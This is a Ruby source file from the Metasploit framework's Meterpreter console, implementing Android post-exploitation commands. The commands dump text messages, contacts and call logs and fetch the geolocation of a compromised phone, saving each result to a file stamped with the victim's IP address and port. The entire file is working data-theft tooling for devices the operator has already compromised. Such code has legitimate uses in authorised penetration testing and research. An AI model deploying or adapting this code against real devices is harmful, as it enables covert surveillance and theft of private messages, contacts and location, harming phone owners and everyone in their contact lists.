# -*- coding: binary -*-
require 'rex/post/meterpreter'


module Rex
module Post
module Meterpreter
module Ui

class Console::CommandDispatcher::Android

	Klass = Console::CommandDispatcher::Android
	include Console::CommandDispatcher
	include Msf::Auxiliary::Report

	def initialize(shell)
		super
	end

	def commands 
		all = {
			"dump_sms" 			=> "Get sms messages",
			"dump_contacts" 	=> "Get contacts list",
			"geolocate" 		=> "Get current lat-long using geolocation",
			"dump_calllog" 		=> "Get call log"
		}

		reqs = {
			"dump_sms"   		=> [ "dump_sms" ],
			"dump_contacts"   	=> [ "dump_contacts"],
			"geolocate"   		=> [ "geolocate"],
			"dump_calllog"   	=> [ "dump_calllog"]
		}

		all.delete_if do |cmd, desc|
			del = false
			reqs[cmd].each do |req|
				next if client.commands.include? req
				del = true
				break
			end

			del
		end

		all
	end


	def cmd_dump_sms(*args)

		path    = "sms_dump_" + Rex::Text.rand_text_alpha(8) + ".txt"
		dump_sms_opts = Rex::Parser::Arguments.new(

			"-h" => [ false, "Help Banner" ],
			"-o" => [ false, "Output path for sms list"]
			
			)

		dump_sms_opts.parse( args ) { | opt, idx, val |
			case opt
				when "-h"
					print_line( "Usage: dump_sms [options]\n" )
					print_line( "Get sms messages." )
					print_line( dump_sms_opts.usage )
					return
				when "-o"
					path = val
			end
		}

		smsList = Array.new
		smsList = client.android.dump_sms

		if smsList.count > 0
			print_line( "[*] Fetching #{smsList.count} sms #{smsList.count == 1? 'message': 'messages'}" )
			begin
				info = client.sys.config.sysinfo

				::File.open( path, 'wb' ) do |fd|

					fd.write("\n=====================\n")
					fd.write("[+] Sms messages dump\n")
					fd.write("=====================\n\n")

					time = Time.new
					fd.write("Date: #{time.inspect}\n")
					fd.write("OS: #{info['OS']}\n")
					fd.write("Remote IP: #{client.sock.peerhost}\n")
					fd.write("Remote Port: #{client.sock.peerport}\n\n")
		
					smsList.each_with_index { |a, index|

							fd.write("##{(index.to_i + 1).to_s()}\n")

							type = "Unknown"
							if a['type'] == "1"
								type = "Incoming"
							elsif a['type'] == "2"
								type = "Outgoing"
							end

							status = "Unknown"
							if a['status'] == "-1"
								status = "NOT_RECEIVED"
							elsif a['status'] == "1"
								status = "SME_UNABLE_TO_CONFIRM"
							elsif a['status'] == "0"
								status = "SUCCESS"
							elsif a['status'] == "64"
								status = "MASK_PERMANENT_ERROR"							
							elsif a['status'] == "32"
								status = "MASK_TEMPORARY_ERROR"		
							elsif a['status'] == "2"
								status = "SMS_REPLACED_BY_SC"	
							end													
								
							fd.write("Type\t: #{type}\n")

							time = a['date'].to_i / 1000
							time = Time.at(time)

							fd.write("Date\t: #{time.strftime("%Y-%m-%d %H:%M:%S")}\n")
							fd.write("Address\t: #{a['address']}\n")
							fd.write("Status\t: #{status}\n")
							fd.write("Message\t: #{a['body']}\n\n")
					}
				end
				
				path = ::File.expand_path( path )

				print_line( "[*] Sms #{smsList.count == 1? 'message': 'messages'} saved to: #{path}" )
				Rex::Compat.open_file( path )
						
				return true
			rescue
				print_error("Error getting messages")
				return false
			end
		else
			print_line( "[*] No sms messages were found!" )
			return false
		end
	end		


	def cmd_dump_contacts(*args)

		path    = "contacts_dump_" + Rex::Text.rand_text_alpha(8) + ".txt"
		dump_contacts_opts = Rex::Parser::Arguments.new(

			"-h" => [ false, "Help Banner" ],
			"-o" => [ false, "Output path for contacts list"]
			
			)

		dump_contacts_opts.parse( args ) { | opt, idx, val |
			case opt
				when "-h"
					print_line( "Usage: dump_contacts [options]\n" )
					print_line( "Get contacts list." )
					print_line( dump_contacts_opts.usage )
					return
				when "-o"
					path = val
			end
		}

		contactList = Array.new
		contactList = client.android.dump_contacts

		if contactList.count > 0
			print_line( "[*] Fetching #{contactList.count} #{contactList.count == 1? 'contact': 'contacts'} into list" )
			begin
				info = client.sys.config.sysinfo

				::File.open( path, 'wb' ) do |fd|

					fd.write("\n======================\n")
					fd.write("[+] Contacts list dump\n")
					fd.write("======================\n\n")

					time = Time.new
					fd.write("Date: #{time.inspect}\n")
					fd.write("OS: #{info['OS']}\n")
					fd.write("Remote IP: #{client.sock.peerhost}\n")
					fd.write("Remote Port: #{client.sock.peerport}\n\n")
		
					contactList.each_with_index { |c, index|

							fd.write("##{(index.to_i + 1).to_s()}\n")
							fd.write("Name\t: #{c['name']}\n")

							if c['number'].count > 0
								(c['number']).each { |n|
									fd.write("Number\t: #{n}\n")
								}
							end

							if c['email'].count > 0
								(c['email']).each { |n|
									fd.write("Email\t: #{n}\n")
								}
							end

							fd.write("\n")
					}
				end
				
				path = ::File.expand_path( path )
				print_line( "[*] Contacts list saved to: #{path}" )
				Rex::Compat.open_file( path )
						
				return true
			rescue
				print_error("Error getting contacts list")
				return false
			end
		else
			print_line( "[*] No contacts were found!" )
			return false
		end
	end		

	def cmd_geolocate(*args)

		generate_map = false
		geolocate_opts = Rex::Parser::Arguments.new(

			"-h" => [ false, "Help Banner" ],
			"-g" => [ false, "Generate map using google-maps"]
			
			)

		geolocate_opts.parse( args ) { | opt, idx, val |
			case opt
				when "-h"
					print_line( "Usage: geolocate [options]\n" )
					print_line( "Get current location using geolocation." )
					print_line( geolocate_opts.usage )
					return
				when "-g"
					generate_map = true
			end
		}

		geoArray = Array.new
		geoArray = client.android.geolocate

		print_line("[*] Current Location:\n")
		print_line("\tLatitude  : #{geoArray[0]['lat']}")
		print_line("\tLongitude : #{geoArray[0]['long']}\n")
		

		if generate_map
			link = "https://maps.google.com/maps?q=#{geoArray[0]['lat']},#{geoArray[0]['long']}"
			print_line("[*] Generated map on google-maps:")
			print_line("[*] #{link}")
			Rex::Compat.open_file(link)
		end

	end		

	def cmd_dump_calllog(*args)

		path    = "dump_calllog_" + Rex::Text.rand_text_alpha(8) + ".txt"
		dump_calllog_opts = Rex::Parser::Arguments.new(

			"-h" => [ false, "Help Banner" ],
			"-o" => [ false, "Output path for call log"]
			
			)

		dump_calllog_opts.parse( args ) { | opt, idx, val |
			case opt
				when "-h"
					print_line( "Usage: dump_calllog [options]\n" )
					print_line( "Get call log." )
					print_line( dump_calllog_opts.usage )
					return
				when "-o"
					path = val
			end
		}

		log = Array.new
		log = client.android.dump_calllog

		if log.count > 0
			print_line( "[*] Fetching #{log.count} #{log.count == 1? 'entry': 'entries'}" )
			begin
				info = client.sys.config.sysinfo

				::File.open( path, 'wb' ) do |fd|

					fd.write("\n=================\n")
					fd.write("[+] Call log dump\n")
					fd.write("=================\n\n")

					time = Time.new
					fd.write("Date: #{time.inspect}\n")
					fd.write("OS: #{info['OS']}\n")
					fd.write("Remote IP: #{client.sock.peerhost}\n")
					fd.write("Remote Port: #{client.sock.peerport}\n\n")
		
					log.each_with_index { |a, index|

							fd.write("##{(index.to_i + 1).to_s()}\n")
								
							fd.write("Number\t: #{a['number']}\n")	
							fd.write("Name\t: #{a['name']}\n")
							fd.write("Date\t: #{a['date']}\n")											
							fd.write("Type\t: #{a['type']}\n")
							fd.write("Duration: #{a['duration']}\n\n")
					}
				end
				
				path = ::File.expand_path( path )
				print_line( "[*] Call log saved to: #{path}" )
				Rex::Compat.open_file( path )
						
				return true
			rescue
				print_error("Error getting call log")
				return false
			end
		else
			print_line( "[*] No call log entries were found!" )
			return false
		end
	end		

	def name
		"Android"
	end

end

end
end
end
end
